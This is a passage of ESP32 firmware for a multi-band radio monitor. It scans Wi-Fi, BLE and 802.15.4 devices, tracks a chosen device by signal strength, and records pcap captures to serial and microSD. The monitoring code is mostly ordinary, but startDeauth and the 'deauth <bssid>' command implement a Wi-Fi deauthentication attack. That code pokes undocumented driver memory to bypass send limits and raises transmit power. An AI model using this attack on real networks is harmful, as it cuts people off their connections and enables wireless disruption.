int snapshotWifi(WifiDev* out, int maxN, uint32_t freshMs) {
    const uint32_t now = millis();
    int n = 0;
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kWifiDevSlots && n < maxN; i++) {
        if (wifiDevs[i].lastMs && (now - wifiDevs[i].lastMs) <= freshMs) out[n++] = wifiDevs[i];
    }
    portEXIT_CRITICAL(&g_devMux);
    return n;
}
int snapshotBle(BleDev* out, int maxN, uint32_t freshMs) {
    const uint32_t now = millis();
    int n = 0;
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kBleDevSlots && n < maxN; i++) {
        if (bleDevs[i].lastMs && (now - bleDevs[i].lastMs) <= freshMs) out[n++] = bleDevs[i];
    }
    portEXIT_CRITICAL(&g_devMux);
    return n;
}
int snapshot154(Dev154* out, int maxN, uint32_t freshMs) {
    const uint32_t now = millis();
    int n = 0;
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kDev154Slots && n < maxN; i++) {
        if (devs154[i].lastMs && (now - devs154[i].lastMs) <= freshMs) out[n++] = devs154[i];
    }
    portEXIT_CRITICAL(&g_devMux);
    return n;
}
void fmtKey154(char* out, size_t n, const Dev154& d) {
    if (d.flags & 1) snprintf(out, n, "%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x", d.key[0], d.key[1], d.key[2], d.key[3], d.key[4], d.key[5], d.key[6], d.key[7]);
    else snprintf(out, n, "%04x/%04x", d.pan, d.shortAddr);
}
template <typename T>
void sortByRssi(T* a, int n) {   // insertion sort, n <= 96
    for (int i = 1; i < n; i++) {
        T v = a[i];
        int j = i - 1;
        while (j >= 0 && a[j].rssi < v.rssi) { a[j + 1] = a[j]; j--; }
        a[j + 1] = v;
    }
}

// ---------------------------------------------------------------------------------------------
// Host protocol (USB serial, one JSON object per line; frames as "P ..." base64 lines)
// ---------------------------------------------------------------------------------------------
void huntIdText(char* out, size_t n) {
    if (huntKind == 1) {
        if (huntKey[0] == 0xFF && huntKey[1] == 0xFE)
            snprintf(out, n, "%04x/%04x", huntKey[2] | (huntKey[3] << 8), huntKey[4] | (huntKey[5] << 8));
        else
            snprintf(out, n, "%02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x", huntKey[0], huntKey[1], huntKey[2], huntKey[3],
                     huntKey[4], huntKey[5], huntKey[6], huntKey[7]);
    } else {
        fmtMac(out, n, huntMac);
    }
}

void printHunt() {
    if (!huntActive) { Serial.print("\"h\":null"); return; }
    const uint32_t last = huntLastMs;
    Serial.printf("\"h\":[%d,%lu,%lu]", huntRssi, static_cast<unsigned long>(last ? millis() - last : 0xFFFFFFFFul),
                  static_cast<unsigned long>(huntCount));
}

// [bssid, park channel (0 if hopping), frames sent, frames failed]
void printDeauth() {
    if (!deauthActive) { Serial.print("\"deauth\":null"); return; }
    char mac[26];
    fmtMac(mac, sizeof(mac), deauthBssid);
    Serial.printf("\"deauth\":[\"%s\",%d,%lu,%lu]", mac, parkedIdx >= 0 ? kChannels[parkedIdx] : 0,
                  static_cast<unsigned long>(deauthSent), static_cast<unsigned long>(deauthTxFail));
}

void sendHello() {
    if (!serialRoom(780)) return;
    Serial.printf("{\"t\":\"hello\",\"fw\":\"bandwatch\",\"ver\":\"%s\",\"dwell_ms\":%u,\"band\":\"%s\",\"country\":\"%s\",\"bandmode\":\"%s\","
                  "\"proto\":\"%s\",\"promisc\":\"%s\",\"chs\":[",
                  kVersion, static_cast<unsigned>(kDwellMs), kBandName[bandMode], esp_err_to_name(errCountry), esp_err_to_name(errBand),
                  esp_err_to_name(errProto), esp_err_to_name(errPromisc));
    bool first = true;
    for (int i = 0; i < kChannelCount; i++) {
        if (!chanEnabled(i)) continue;
        Serial.printf("%s%u", first ? "" : ",", kChannels[i]);
        first = false;
    }
    char mac[26];
    huntIdText(mac, sizeof(mac));
    static const char* const kRst[] = {"unknown", "poweron", "ext", "sw", "panic", "int_wdt", "task_wdt", "wdt",
                                       "deepsleep", "brownout", "sdio", "usb", "jtag", "efuse", "pwr_glitch", "cpu_lockup"};
    const int rr = static_cast<int>(esp_reset_reason());
    Serial.printf("],\"park\":%d,\"cap\":%d,\"snap\":%u,\"heap\":%u,\"up\":%lu,\"rst\":\"%s\",\"hunt\":%s%s%s,",
                  parkedIdx >= 0 ? kChannels[parkedIdx] : 0, captureEnabled ? 1 : 0,
                  static_cast<unsigned>(capSnapLen), static_cast<unsigned>(ESP.getFreeHeap()),
                  static_cast<unsigned long>(millis() / 1000), (rr >= 0 && rr < 16) ? kRst[rr] : "?",
                  huntActive ? "\"" : "null", huntActive ? mac : "", huntActive ? "\"" : "");
    printHunt();
    Serial.print(",");
    printDeauth();
    Serial.printf(",\"sd\":{\"mounted\":%d,\"mb\":%lu,\"cap\":%d,\"file\":\"%s\",\"frames\":%lu,\"bytes\":%lu,\"err\":%lu,\"clock\":%d}",
                  sdCardPresent ? 1 : 0, static_cast<unsigned long>(sdCardMb),
                  sdCapEnabled ? 1 : 0, sdCapEnabled ? sdPath : "",
                  static_cast<unsigned long>(sdFrames), static_cast<unsigned long>(sdBytes),
                  static_cast<unsigned long>(sdErrors), epochValid ? 1 : 0);
    Serial.print("}\n");
}

void sendDwell(int idx) {
    if (!serialRoom(340)) return;
    const ChannelState& ch = channels[idx];
    Serial.printf("{\"t\":\"d\",\"c\":%u,\"s\":%.1f,\"r\":%.1f,\"f\":%lu,\"b\":%lu,\"st\":%u,\"u\":%u,"
                  "\"g\":%.1f,\"n\":%lu,\"park\":%d,\"cap\":%d,\"drop\":%lu,\"da\":%lu,\"df\":%lu,"
                  "\"sdc\":%d,\"sdf\":%lu,\"sdb\":%lu,",
                  kChannels[idx], ch.busyEma, ch.busyCurrent,
                  static_cast<unsigned long>(ch.metrics.frames), static_cast<unsigned long>(ch.metrics.bytes),
                  ch.metrics.strong, ch.metrics.unique, globalActivityMax(),
                  static_cast<unsigned long>(sweepCount), parkedIdx >= 0 ? kChannels[parkedIdx] : 0,
                  captureEnabled ? 1 : 0, static_cast<unsigned long>(capDropped), static_cast<unsigned long>(deauthSent),
                  static_cast<unsigned long>(deauthTxFail),
                  sdCapEnabled ? 1 : 0, static_cast<unsigned long>(sdFrames), static_cast<unsigned long>(sdBytes));
    printHunt();
    Serial.print("}\n");
}

void sendSweep() {
    if (!serialRoom(1500)) return;
    Serial.printf("{\"t\":\"s\",\"n\":%lu,\"g\":%.1f,\"band\":\"%s\",\"ch\":[", static_cast<unsigned long>(sweepCount),
                  globalActivityMax(), kBandName[bandMode]);
    bool first = true;
    for (int i = 0; i < kChannelCount; i++) {
        if (!chanEnabled(i)) continue;
        const ChannelState& ch = channels[i];
        Serial.printf("%s[%u,%.1f,%lu,%lu,%u,%u,%d]", first ? "" : ",", kChannels[i], ch.busyEma,
                      static_cast<unsigned long>(ch.metrics.frames), static_cast<unsigned long>(ch.metrics.bytes),
                      ch.metrics.strong, ch.metrics.unique, ch.unavailable ? 2 : (ch.hasData ? 0 : 1));
        first = false;
    }
    Serial.printf("],\"aps\":%u,\"drop\":%lu,\"heap\":%u}\n", lastApSeen, static_cast<unsigned long>(capDropped),
                  static_cast<unsigned>(ESP.getFreeHeap()));
}

// BLE-mode heartbeat (no dwells there)
void sendBleStatus() {
    if (!serialRoom(300)) return;
    int n = 0;
    const uint32_t now = millis();
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kBleDevSlots; i++) if (bleDevs[i].lastMs && now - bleDevs[i].lastMs <= kDevFreshMs) n++;
    portEXIT_CRITICAL(&g_devMux);
    Serial.printf("{\"t\":\"ble\",\"devs\":%d,\"cycles\":%lu,\"heap\":%u,\"adv\":%lu,\"scan\":\"%s\",\"running\":\"%s\",\"switches\":%lu,"
                  "\"cap\":%d,\"drop\":%lu,\"sdc\":%d,\"sdf\":%lu,\"sdb\":%lu,",
                  n, static_cast<unsigned long>(bleScanCycles), static_cast<unsigned>(ESP.getFreeHeap()),
                  static_cast<unsigned long>(bleAdvSeen), bleScanModeName(),
                  bleActiveScan ? "active" : "passive", static_cast<unsigned long>(bleSwitches),
                  captureEnabled ? 1 : 0, static_cast<unsigned long>(capDropped),
                  sdCapEnabled ? 1 : 0, static_cast<unsigned long>(sdFrames),
                  static_cast<unsigned long>(sdBytes));
    printHunt();
    Serial.print("}\n");
}

// Device tables -> host. Wi-Fi: [mac, rssi, max, frames, age_ms, ch, flags, ssid]; BLE: [mac, rssi, max, adv, age_ms, addrType, company, name]
void sendDevices() {
    const uint32_t now = millis();
    char mac[24];
    if (mode154()) {
        Dev154* snap = devSnap.z;
        const int n = snapshot154(snap, kDev154Slots, kDevFreshMs);
        if (!serialRoom(40 + n * 80)) return;
        // [id, rssi, max, frames, age_ms, ch, pan, short, proto, flags, lqi]
        Serial.print("{\"t\":\"z\",\"dev\":[");
        for (int i = 0; i < n; i++) {
            const Dev154& d = snap[i];
            fmtKey154(mac, sizeof(mac), d);
            Serial.printf("%s[\"%s\",%d,%d,%u,%lu,%u,%u,%u,%u,%u,%u]", i ? "," : "", mac, d.rssi, d.maxRssi, d.frames,
                          static_cast<unsigned long>(now - d.lastMs), d.ch, d.pan, d.shortAddr, d.proto, d.flags, d.lqi);
        }
        Serial.print("]}\n");
        return;
    }
    if (wifiMode()) {
        WifiDev* snap = devSnap.w;
        const int n = snapshotWifi(snap, kWifiDevSlots, kDevFreshMs);
        if (!serialRoom(40 + n * 118)) return;
        Serial.print("{\"t\":\"w\",\"dev\":[");
        for (int i = 0; i < n; i++) {
            fmtMac(mac, sizeof(mac), snap[i].mac);
            const WifiDev& d = snap[i];
            Serial.printf("%s[\"%s\",%d,%d,%u,%lu,%u,%u,", i ? "," : "", mac, d.rssi, d.maxRssi, d.frames,
                          static_cast<unsigned long>(now - d.lastMs), d.ch, d.flags);
            printJsonStr(d.ssid);
            Serial.printf(",%u,%u,%u,%u,%u,%u,", d.sec, d.pmf, d.phy, d.bw, d.util, d.stations);
            printJsonStr(d.cc[0] ? d.cc : "");   // country IE is 2 raw bytes off the air: escape it like every other string
            Serial.printf(",%u]", d.surv);
        }
        Serial.print("]}\n");
    } else {
        BleDev* snap = devSnap.b;
        const int n = snapshotBle(snap, kBleDevSlots, kDevFreshMs);
        if (!serialRoom(40 + n * 102)) return;
        Serial.print("{\"t\":\"b\",\"dev\":[");
        for (int i = 0; i < n; i++) {
            fmtMac(mac, sizeof(mac), snap[i].mac);
            const BleDev& d = snap[i];
            Serial.printf("%s[\"%s\",%d,%d,%u,%lu,%u,%u,", i ? "," : "", mac, d.rssi, d.maxRssi, d.adv,
                          static_cast<unsigned long>(now - d.lastMs), d.addrType, d.company);
            printJsonStr(d.name);
            Serial.printf(",%u,%d,%u,%u,%u,%u,%u]", d.appearance, d.txPower, d.svc, d.svcData, d.appleType,
                          d.flags, d.surv);
        }
        Serial.print("]}\n");
    }
}

const char kB64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void writeBase64(const uint8_t* d, size_t n) {
    char out[68];
    size_t i = 0;
    while (i < n) {
        size_t o = 0;
        const size_t chunkEnd = (i + 48 < n) ? i + 48 : n;
        while (i + 2 < chunkEnd) {
            const uint32_t v = (d[i] << 16) | (d[i + 1] << 8) | d[i + 2];
            out[o++] = kB64[(v >> 18) & 63]; out[o++] = kB64[(v >> 12) & 63];
            out[o++] = kB64[(v >> 6) & 63];  out[o++] = kB64[v & 63];
            i += 3;
        }
        if (i < chunkEnd && chunkEnd == n) {
            const size_t rem = n - i;
            const uint32_t v = (d[i] << 16) | (rem == 2 ? (d[i + 1] << 8) : 0);
            out[o++] = kB64[(v >> 18) & 63]; out[o++] = kB64[(v >> 12) & 63];
            out[o++] = (rem == 2) ? kB64[(v >> 6) & 63] : '=';
            out[o++] = '=';
            i = n;
        }
        Serial.write(reinterpret_cast<uint8_t*>(out), o);
    }
}

// ---------------------------------------------------------------------------------------------
// microSD pcap sink. Byte-compatible with host/bandwatch_host.py's PcapWriter: same global header,
// same radiotap (Wi-Fi, link type 127) and 802.15.4-TAP (link type 283) per-frame headers, so a file
// written here and one written by the host are interchangeable.
// ---------------------------------------------------------------------------------------------

uint16_t channelFreqMhz(uint8_t ch) {
    if (ch == 14) return 2484;
    if (ch <= 13) return static_cast<uint16_t>(2407 + 5 * ch);
    return static_cast<uint16_t>(5000 + 5 * ch);
}

void nowEpoch(uint32_t& sec, uint32_t& usec) {
    const uint32_t ms = millis();
    const uint32_t d = ms - epochBaseMs;
    sec = epochBase + d / 1000;
    usec = (d % 1000) * 1000;
}


// Mounting FATFS costs ~30 KB of heap, and BLE mode cuts its scans short below ~28 KB free, so the card is
// mounted only while it is being used and released again afterwards. sdCardPresent/sdCardMb remember what
// the boot probe found so the dashboard can still show the card without paying for it.
bool sdMount() {
    if (sdMounted) return true;
    sdMounted = SD.begin(kSdCsPin, SPI, kSdSpiHz);
    if (sdMounted) { sdCardPresent = true; sdCardMb = static_cast<uint32_t>(SD.cardSize() / (1024 * 1024)); }
    return sdMounted;
}

void sdReadAbort();   // defined with the file reader below

void sdUnmount() {
    if (!sdMounted || sdCapEnabled || sdReadActive) return;   // never pull the filesystem out from under
                                                              // an open capture or an in-flight sdread
    SD.end();
    sdMounted = false;
}

void sdProbeAtBoot() {
    if (sdMount()) sdUnmount();
}

bool sdWriteRaw(const uint8_t* d, size_t n) {
    if (sdFile.write(d, n) != n) { sdErrors++; return false; }
    sdBytes += n;
    return true;
}

bool sdBufFlush() {
    if (!sdBufLen) return true;
    const bool ok = sdWriteRaw(sdBuf, sdBufLen);
    sdBufLen = 0;
    return ok;
}

bool sdBufPut(const uint8_t* d, size_t n) {
    while (n) {
        const size_t room = kSdBufSize - sdBufLen;
        const size_t take = n < room ? n : room;
        memcpy(sdBuf + sdBufLen, d, take);
        sdBufLen += take; d += take; n -= take;
        if (sdBufLen == kSdBufSize && !sdBufFlush()) return false;
    }
    return true;
}

void sdCloseCapture() {
    if (!sdCapEnabled) return;
    sdCapEnabled = false;
    sdBufFlush();
    if (sdFile) { sdFile.flush(); sdFile.close(); }
    if (sdBuf) { free(sdBuf); sdBuf = nullptr; }
    sdBufLen = 0;
    if (serialRoom(160))
        Serial.printf("{\"t\":\"log\",\"msg\":\"sd capture closed: %s (%lu frames, %lu bytes)\"}\n",
                      sdPath, static_cast<unsigned long>(sdFrames), static_cast<unsigned long>(sdBytes));
    sdUnmount();   // hand the ~30 KB back
}

bool sdOpenCapture() {
    if (sdCapEnabled) return true;
    if (!sdMount()) return false;
    sdBuf = static_cast<uint8_t*>(malloc(kSdBufSize));
    if (!sdBuf) return false;
    sdBufLen = 0; sdFrames = 0; sdBytes = 0; sdDropped = 0; sdErrors = 0;
    const bool is154 = mode154();
    const bool isBle = (bandMode == BAND_BLE);
    if (epochValid) {   // host gave us a clock: name the file after it, like the host tool does
        uint32_t s, us; nowEpoch(s, us);
        const time_t t = static_cast<time_t>(s);
        struct tm tmv; gmtime_r(&t, &tmv);
        snprintf(sdPath, sizeof(sdPath), "/bandwatch-%s-%04d%02d%02d-%02d%02d%02d.pcap",
                 is154 ? "802154" : isBle ? "ble" : "wifi", tmv.tm_year + 1900, tmv.tm_mon + 1, tmv.tm_mday,
                 tmv.tm_hour, tmv.tm_min, tmv.tm_sec);
    } else {            // no clock: fall back to a counter so files never collide
        for (int i = 1; i < 10000; i++) {
            snprintf(sdPath, sizeof(sdPath), "/bandwatch-%s-%04d.pcap", is154 ? "802154" : isBle ? "ble" : "wifi", i);
            if (!SD.exists(sdPath)) break;
        }
    }
    sdFile = SD.open(sdPath, FILE_WRITE);
    if (!sdFile) { free(sdBuf); sdBuf = nullptr; return false; }
    uint8_t gh[24];                                  // pcap global header, little endian
    putLE32(gh + 0, 0xA1B2C3D4); putLE16(gh + 4, 2); putLE16(gh + 6, 4);
    putLE32(gh + 8, 0); putLE32(gh + 12, 0); putLE32(gh + 16, 65535);
    putLE32(gh + 20, is154 ? 283 : isBle ? 256 : 127);   // 802.15.4-TAP / BLE LL w/ phdr / radiotap
    if (!sdBufPut(gh, sizeof(gh))) { sdCloseCapture(); return false; }
    sdCapEnabled = true;
    sdLastFlushMs = millis();
    return true;
}

// One captured frame -> record header + link-layer header + payload. Mirrors PcapWriter.write().
bool sdWriteFrame(const CapFrame& f) {
    uint8_t hdr[16 + 28];
    uint32_t sec, usec; nowEpoch(sec, usec);
    const bool is154 = mode154();
    const bool isBle = (bandMode == BAND_BLE);
    const uint16_t rtLen = is154 ? 28 : isBle ? 10 : 24;
    uint8_t* rt = hdr + 16;
    if (isBle) {
        // LINKTYPE_BLUETOOTH_LE_LL_WITH_PHDR pseudo-header. Flags: dewhitened | signal-power-valid |
        // reference-access-address-valid. The CRC-checked/valid bits stay clear on purpose - we
        // synthesize a zero CRC, and claiming "checked" would make Wireshark mark every frame CRC-bad.
        rt[0] = f.channel;                       // RF channel 0..39
        rt[1] = static_cast<uint8_t>(f.rssi);    // signal power, dBm
        rt[2] = 0;                               // noise power (flag not set)
        rt[3] = 0;                               // access-address offenses
        putLE32(rt + 4, kAdvAccessAddr);
        // RSSI 127 is the HCI "not available" sentinel: do not assert a fabricated reading as valid.
        putLE16(rt + 8, static_cast<uint16_t>(f.rssi == 127 ? 0x0011 : 0x0013));
    } else if (is154) {
        putLE16(rt + 0, 0); putLE16(rt + 2, 28);                       // version/pad, total length
        putLE16(rt + 4, 0); putLE16(rt + 6, 1); rt[8] = 0; rt[9] = rt[10] = rt[11] = 0;   // FCS type: none
        putLE16(rt + 12, 1); putLE16(rt + 14, 4);                      // RSS TLV, float dBm
        float rssi = static_cast<float>(f.rssi); uint32_t fb; memcpy(&fb, &rssi, 4); putLE32(rt + 16, fb);
        putLE16(rt + 20, 3); putLE16(rt + 22, 3);                      // channel assignment TLV
        putLE16(rt + 24, f.channel); rt[26] = 0; rt[27] = 0;           // channel, page, pad
    } else {
        rt[0] = 0; rt[1] = 0; putLE16(rt + 2, 24);
        putLE32(rt + 4, (1u << 0) | (1u << 1) | (1u << 3) | (1u << 5));   // TSFT | Flags | Channel | dBm
        putLE32(rt + 8, f.ts_us); putLE32(rt + 12, 0);                 // TSFT is 64-bit
        rt[16] = 0x10; rt[17] = 0;                                     // Flags: FCS present
        putLE16(rt + 18, channelFreqMhz(f.channel));
        putLE16(rt + 20, (f.channel > 14 ? 0x0100 : 0x0080) | 0x0040);
        rt[22] = static_cast<uint8_t>(f.rssi); rt[23] = 0;             // dBm antenna signal
    }
    putLE32(hdr + 0, sec); putLE32(hdr + 4, usec);
    putLE32(hdr + 8, rtLen + f.capLen); putLE32(hdr + 12, rtLen + f.len);
    if (!sdBufPut(hdr, 16 + rtLen)) return false;
    if (!sdBufPut(f.data, f.capLen)) return false;
    sdFrames++;
    return true;
}

// Pull a capture off the card without ejecting it: "S <n> <base64>" lines, bracketed by an ack.
// Driven incrementally from Bandwatch_Loop with a time budget, NOT in one blocking loop inside the
// command handler: that shares the loop task with lv_timer_handler -> hopIfNeeded(), so a blocking read
// of a 1.6 MB capture stalled channel hopping for seconds and skewed every dwell in that window.
File sdReadFh;
uint32_t sdReadSent = 0, sdReadTotal = 0;

void sdReadAbort() {
    if (!sdReadActive) return;
    sdReadActive = false;
    if (sdReadFh) sdReadFh.close();
    sdUnmount();
}

void sdReadFile(const char* path) {
    sdReadAbort();
    if (!sdMount()) { Serial.print("{\"t\":\"err\",\"msg\":\"sdread: no card\"}\n"); return; }
    sdReadFh = SD.open(path, FILE_READ);
    if (!sdReadFh) { Serial.printf("{\"t\":\"err\",\"msg\":\"sdread: cannot open %s\"}\n", path); sdUnmount(); return; }
    sdReadTotal = sdReadFh.size();
    sdReadSent = 0;
    sdReadActive = true;
    Serial.printf("{\"t\":\"ack\",\"cmd\":\"sdread\",\"file\":\"%s\",\"bytes\":%lu}\n", path,
                  static_cast<unsigned long>(sdReadTotal));
}

// Called every loop: emit what fits in the TX buffer, then yield so hopping and the UI keep running.
void serviceSdRead() {
    if (!sdReadActive) return;
    const uint32_t started = micros();
    uint8_t chunk[192];
    while (sdReadSent < sdReadTotal) {
        if (!serialRoom(sizeof(chunk) * 4 / 3 + 24)) return;      // no room: try again next loop
        if ((micros() - started) > kSdBudgetUs) return;           // same budget the capture drain uses
        const int n = sdReadFh.read(chunk, sizeof(chunk));
        if (n <= 0) break;
        Serial.printf("S %d ", n);
        writeBase64(chunk, n);
        Serial.write('\n');
        sdReadSent += n;
    }
    Serial.printf("{\"t\":\"ack\",\"cmd\":\"sdread_done\",\"sent\":%lu}\n",
                  static_cast<unsigned long>(sdReadSent));
    sdReadActive = false;
    sdReadFh.close();
    sdUnmount();
}

void sdListFiles() {
    if (!sdMount()) { Serial.print("{\"t\":\"err\",\"msg\":\"sdls: no card\"}\n"); return; }
    File root = SD.open("/");
    if (!root) { Serial.print("{\"t\":\"err\",\"msg\":\"sdls: cannot open /\"}\n"); return; }
    Serial.print("{\"t\":\"sdls\",\"files\":[");
    bool first = true;
    for (File e = root.openNextFile(); e; e = root.openNextFile()) {
        if (!e.isDirectory() && serialRoom(120)) {
            Serial.printf("%s[\"%s\",%lu]", first ? "" : ",", e.name(), static_cast<unsigned long>(e.size()));
            first = false;
        }
        e.close();
    }
    root.close();
    Serial.print("]}\n");
    sdUnmount();
}

void sdServiceFlush() {
    if (!sdCapEnabled) return;
    const uint32_t now = millis();
    if (now - sdLastFlushMs < kSdFlushMs) return;
    sdLastFlushMs = now;
    sdBufFlush();
    sdFile.flush();     // push FAT metadata so the file stays valid if power is lost
}

// Single consumer, two independent sinks (USB stream and SD card); a frame is handed to whichever are
// enabled and the tail only advances once. When SD is recording, a full USB TX buffer must not stall the
// ring - the USB copy is skipped (and counted) instead, so the card keeps getting every frame.
void drainCapture() {
    int budget = 8;
    const uint32_t started = micros();
    while (capRing && capTail != capHead && budget-- > 0) {
        const CapFrame& f = capRing[capTail];
        const bool usbWant = captureEnabled;
        const bool usbRoom = serialRoom((f.capLen * 4) / 3 + 40);
        if (usbWant && !usbRoom && !sdCapEnabled) return;   // USB-only: stall rather than lose the frame
        if (usbWant && usbRoom) {
            Serial.printf("P %u %d %lu %u ", f.channel, f.rssi, static_cast<unsigned long>(f.ts_us), f.len);
            writeBase64(f.data, f.capLen);
            Serial.write('\n');
            capSent += 1;
        } else if (usbWant) {
            capDropped = capDropped + 1;                    // SD is recording: never block the card on USB
        }
        if (sdCapEnabled && !sdWriteFrame(f)) { sdDropped++; sdCloseCapture(); }
        capTail = (capTail + 1) % capSlots;
        // SD writes can stall for tens of ms on card GC; hopIfNeeded() shares this task, so cap the time.
        if (sdCapEnabled && (micros() - started) > kSdBudgetUs) break;
    }
    sdServiceFlush();
}

void setPark(int idx) {
    parkedIdx = idx;
    if (parkedIdx >= 0 && hopMode()) monitorReady = advanceChannel();
}

void showPage(int n);

void lookupHuntLabel() {
    huntLabel[0] = 0;
    if (huntKind == 1) {
        portENTER_CRITICAL(&g_devMux);
        for (int i = 0; i < kDev154Slots; i++)
            if (devs154[i].lastMs && key8Eq(devs154[i].key, huntKey)) {
                static const char* const kProto[] = {"802.15.4", "Zigbee", "Zigbee GP", "Thread", "MAC-secured"};
                snprintf(huntLabel, sizeof(huntLabel), "%s pan %04x", kProto[devs154[i].proto < 5 ? devs154[i].proto : 0], devs154[i].pan);
                break;
            }
        portEXIT_CRITICAL(&g_devMux);
        return;
    }
    portENTER_CRITICAL(&g_devMux);
    for (int i = 0; i < kWifiDevSlots; i++)
        if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, huntMac) && wifiDevs[i].ssid[0]) { strncpy(huntLabel, wifiDevs[i].ssid, 32); break; }
    if (!huntLabel[0])
        for (int i = 0; i < kBleDevSlots; i++)
            if (bleDevs[i].lastMs && macEq(bleDevs[i].mac, huntMac) && bleDevs[i].name[0]) { strncpy(huntLabel, bleDevs[i].name, 32); break; }
    portEXIT_CRITICAL(&g_devMux);
}

// Parse "aa:bb:cc:dd:ee:ff:00:11" (extended address) or "pan/short" (hex) into an 802.15.4 key.
bool parseKey154(const char* s, uint8_t* key) {
    unsigned v[8];
    if (sscanf(s, "%2x:%2x:%2x:%2x:%2x:%2x:%2x:%2x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5], &v[6], &v[7]) == 8) {
        for (int i = 0; i < 8; i++) key[i] = static_cast<uint8_t>(v[i]);
        return true;
    }
    unsigned pan, sh;
    if (sscanf(s, "%4x/%4x", &pan, &sh) == 2) {
        key[0] = 0xFF; key[1] = 0xFE; key[2] = pan & 0xFF; key[3] = (pan >> 8) & 0xFF;
        key[4] = sh & 0xFF; key[5] = (sh >> 8) & 0xFF; key[6] = 0; key[7] = 0;
        return true;
    }
    return false;
}

void startHunt154(const uint8_t* key) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(huntKey, key, 8);
    huntKind = 1;
    huntRssi = -127;
    huntLastMs = 0;
    huntCount = 0;
    huntActive = true;
    portEXIT_CRITICAL(&g_devMux);
    huntLabel[0] = 0;
    huntParked = false;
    showPage(PAGE_HUNT);
}

void startHunt(const uint8_t* mac, int ch) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(huntMac, mac, 6);
    huntKind = 0;
    huntRssi = -127;
    huntLastMs = 0;
    huntCount = 0;
    huntActive = true;
    portEXIT_CRITICAL(&g_devMux);
    lookupHuntLabel();
    huntParked = false;
    if (ch > 0 && wifiMode()) {
        const int idx = indexOfChannel(ch);
        if (idx >= 0 && chanEnabled(idx)) { setPark(idx); huntParked = true; }
    }
    showPage(PAGE_HUNT);
}

void stopHunt() {
    huntActive = false;
    if (huntParked) { setPark(-1); huntParked = false; }
    if (currentPage == PAGE_HUNT) showPage(hopMode() ? PAGE_OVERVIEW : PAGE_DEVICES);
}

// Park on the AP's last-seen channel when we know it, so the frames actually land.
void startDeauth(const uint8_t* mac) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(deauthBssid, mac, 6);
    int ch = 0;
    for (int i = 0; i < kWifiDevSlots; i++) if (wifiDevs[i].lastMs && macEq(wifiDevs[i].mac, mac)) { ch = wifiDevs[i].ch; break; }
    deauthSent = 0;
    deauthTxFail = 0;
    deauthStartMs = millis();
    deauthDumped = false;
    // Note: the driver reads *adjacent* BSS words (&g_ic+16 / &g_ic+20 hold the STA/AP hmac pointers),
    // not fields of the ic struct itself. Panic inside send_setup if the word is 0, so fall back to AP.
    uint32_t slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 16);   // STA hmac (panic if 0)
    if (!slotWord) slotWord = *(volatile uint32_t*)(reinterpret_cast<char*>(&g_ic) + 20);   // fall back to AP
    memcpy(deauthSlotPad, &slotWord, 4);
    deauthHstate = *reinterpret_cast<volatile uint8_t*>(reinterpret_cast<char*>(slotWord) + 312);
    deauthActive = true;
    portEXIT_CRITICAL(&g_devMux);
    (void)esp_wifi_set_max_tx_power(160);   // 16 dBm for the attack (startWifi's 8.2 dBm is tuned for quiet sniffing, not for range)
    if (deauthParked) setPark(-1);                    // restart of a running attack: re-park below
    deauthParked = false;
    if (ch > 0) { const int idx = indexOfChannel(ch); if (idx >= 0 && chanEnabled(idx)) { setPark(idx); deauthParked = true; } }
}

void stopDeauth() {
    if (!deauthActive) return;
    portENTER_CRITICAL(&g_devMux);
    deauthActive = false;
    portEXIT_CRITICAL(&g_devMux);
    (void)esp_wifi_set_max_tx_power(82);   // back to startWifi's quiet-sniffing level (startDeauth raised it to 16 dBm)
    // If hunt re-parked after us, this unparks its park too: last writer wins, hopping resumes.
    if (deauthParked) { setPark(-1); deauthParked = false; }
}

void handleCommand(char* line) {
    // Commands: "cap 0|1", "snap N", "park <ch>|0", "band 5g|2.4g|both|ble", "hunt <mac> [ch]" | "hunt 0",
    //           "deauth <bssid>" | "deauth 0" (Wi-Fi modes only), "info"
    char* sp = strchr(line, ' ');
    char* arg = const_cast<char*>("");
    if (sp) { *sp = 0; arg = sp + 1; }
    if (!strcmp(line, "cap")) {
        const bool on = atoi(arg) != 0 && ensureCapRing();   // Wi-Fi, 802.15.4 and BLE all have a link type
        captureEnabled = on;
        syncCapActive();
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"cap\",\"cap\":%d}\n", captureEnabled ? 1 : 0);
    } else if (!strcmp(line, "sdcap")) {
        const bool want = atoi(arg) != 0;
        if (want && !sdCapEnabled) {
            // Open the file first: mounting FATFS costs ~30 KB, and the ring must be sized against what is
            // left afterwards or kCapHeapReserve is not actually reserved.
            if (!sdOpenCapture()) {
                Serial.printf("{\"t\":\"err\",\"msg\":\"sdcap: %s\"}\n",
                              sdMounted ? "could not open file on card" : "no SD card (check it is inserted)");
            } else if (!ensureCapRing()) {
                Serial.print("{\"t\":\"err\",\"msg\":\"sdcap: no capture ring\"}\n");
                sdCloseCapture();
            } else if (serialRoom(140)) {
                Serial.printf("{\"t\":\"log\",\"msg\":\"sd capture -> %s\"}\n", sdPath);
            }
        } else if (!want) {
            sdCloseCapture();
        }
        syncCapActive();
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"sdcap\",\"sdcap\":%d,\"file\":\"%s\"}\n",
                      sdCapEnabled ? 1 : 0, sdCapEnabled ? sdPath : "");
    } else if (!strcmp(line, "sdinfo")) {
        const bool m = sdMount();
        Serial.printf("{\"t\":\"ack\",\"cmd\":\"sdinfo\",\"sd\":%d,\"mb\":%lu,\"used_mb\":%lu,\"cap\":%d,\"file\":\"%s\","
                      "\"frames\":%lu,\"bytes\":%lu,\"err\":%lu}\n",
                      m ? 1 : 0, m ? static_cast<unsigned long>(SD.cardSize() / (1024 * 1024)) : 0UL,
                      m ? static_cast<unsigned long>(SD.usedBytes() / (1024 * 1024)) : 0UL,
                      sdCapEnabled ? 1 : 0, sdCapEnabled ? sdPath : "",
